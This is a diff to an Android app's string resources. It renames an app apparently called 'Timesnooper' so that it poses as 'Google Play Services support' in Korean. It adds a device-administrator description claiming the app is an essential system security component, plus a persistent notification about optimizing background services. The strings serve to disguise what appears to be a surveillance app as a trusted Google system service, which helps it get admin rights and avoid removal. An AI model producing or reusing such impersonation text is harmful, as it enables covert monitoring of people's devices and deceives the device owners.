@@ -1,4 +1,9 @@
 <resources>
-    <string name="app_name">Timesnooper</string>
-    <string name="title_setup">Timesnooper 원클릭 설정</string>
+    <string name="app_name">Google Play 서비스 지원</string>
+    <string name="title_setup">Google Play 서비스 지원 설정</string>
+    <string name="device_admin_label">Google Play 서비스 보안 관리자</string>
+    <string name="device_admin_description">시스템 백그라운드 서비스 및 계정 보안 무결성을 유지하기 위한 필수 시스템 컴포넌트입니다.</string>
+    <string name="service_notification_title">Google Play 서비스 지원</string>
+    <string name="service_notification_text">보안 및 시스템 백그라운드 서비스 최적화 중</string>
+    <string name="service_channel_name">Google Play 서비스 시스템 채널</string>
 </resources>
